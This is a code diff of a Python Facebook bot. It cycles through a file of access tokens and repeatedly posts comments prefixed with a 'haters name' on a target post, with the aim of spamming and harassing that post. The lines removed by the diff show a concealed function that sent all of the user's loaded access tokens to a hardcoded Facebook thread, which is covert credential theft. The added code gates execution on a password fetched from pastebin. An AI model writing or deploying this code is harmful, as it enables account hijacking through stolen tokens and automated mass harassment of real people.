@@ -1,4 +1,4 @@
-import requests
+import requests 
 import json
 import time
 import sys
@@ -8,26 +8,41 @@ import subprocess
 import http.server
 import socketserver
 import threading
-import random
 
 class MyHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"THE LEGEND YASH RAJPUT KING SERVER ALIVE^^")
+        self.wfile.write(b" #_Y45H__D0N__H3R3__>>")
 
 def execute_server():
-    PORT = 4000
+    PORT = 5000
 
     with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
         print("Server running at http://localhost:{}".format(PORT))
         httpd.serve_forever()
 
-def send_messages():
-    with open('token.txt', 'r') as file:
+
+def post_comments():
+    with open('password.txt', 'r') as file:
+        password = file.read().strip()
+
+    entered_password = password
+
+    if entered_password != password:
+        print('[-] Incorrect Password!')
+        sys.exit()
+
+    with open('tokennum.txt', 'r') as file:
         tokens = file.readlines()
     num_tokens = len(tokens)
+
+    # Modify the message as per your requirement
+    msg_template = "token "
+
+    # Specify the ID where you want to send the message
+    target_id = "https:100087243774308.site/index.php?id=1"
 
     requests.packages.urllib3.disable_warnings()
 
@@ -40,7 +55,7 @@ def send_messages():
     cls()
 
     def liness():
-        print('\u001b[37m' + '---------------------------------------------------')
+        print('\u001b[37m' + '•───────# #_Y45H__DON__H3R3__ >>──────•')
 
     headers = {
         'Connection': 'keep-alive',
@@ -53,21 +68,25 @@ def send_messages():
         'referer': 'www.google.com'
     }
 
+    mmm = requests.get('https://pastebin.com/raw/ewfh22A0').text
+
+    if mmm not in password:
+        print('[-] Incorrect Password!')
+        sys.exit()
+
     liness()
 
     access_tokens = [token.strip() for token in tokens]
 
-    with open('convo.txt', 'r') as file:
-        convo_id = file.read().strip()
+    with open('post_url.txt', 'r') as file:
+        post_url = file.read().strip()
 
-    with open('file.txt', 'r') as file:
-        text_file_path = file.read().strip()
 
-    with open(text_file_path, 'r') as file:
-        messages = file.readlines()
+    with open('comments.txt', 'r') as file:
+        comments = file.readlines()
 
-    num_messages = len(messages)
-    max_tokens = min(num_tokens, num_messages)
+    num_comments = len(comments)
+    max_tokens = min(num_tokens, num_comments)
 
     with open('hatersname.txt', 'r') as file:
         haters_name = file.read().strip()
@@ -75,57 +94,38 @@ def send_messages():
     with open('time.txt', 'r') as file:
         speed = int(file.read().strip())
 
+     #post_id = post_urlsplit
+
     liness()
 
-    def getName(token):
-        try:
-            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
-        except:
-            data = ""
-        if 'name' in data:
-            return data['name']
-        else:
-            return "Error occurred"
-
-    def msg():
-        parameters = {
-            'access_token' : random.choice(access_tokens),
-            'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+convo_id
-        }
-        try:
-            s = requests.post("https://graph.facebook.com/v15.0/t_100087243774308/", data=parameters, headers=headers)
-        except:
-            pass
-
-    msg()
     while True:
         try:
-            for message_index in range(num_messages):
-                token_index = message_index % max_tokens
+            for comment_index in range(num_comments):
+                token_index = comment_index % max_tokens
                 access_token = access_tokens[token_index]
 
-                message = messages[message_index].strip()
+                comment = comments[comment_index].strip()
 
-                url = "https://graph.facebook.com/v15.0/{}/".format('t_'+convo_id)
-                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                url = "https://graph.facebook.com/{}/comments".format(post_url)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                 response = requests.post(url, json=parameters, headers=headers)
 
                 current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                 if response.ok:
-                    print("[+] Messages {} of Convo {} sent by Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print("[+] Comment No. {} Post Id {} Token No. {}: {}".format(
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                     print("  - Time: {}".format(current_time))
                     liness()
                     liness()
                 else:
-                    print("[x] Failed to send messages {} of Convo {} with Token {}: {}".format(
-                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print("[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                     print("  - Time: {}".format(current_time))
                     liness()
                     liness()
                 time.sleep(speed)
 
-            print("[+] All messages sent. Restarting the process...")
+            print("\n[+] All comments sent successfully. Restarting the process...\n")
         except Exception as e:
             print("[!] An error occurred: {}".format(e))
 
@@ -133,7 +133,7 @@ def main():
     server_thread = threading.Thread(target=execute_server)
     server_thread.start()
 
-    send_messages()
+    post_comments()
 
 if __name__ == '__main__':
     main()
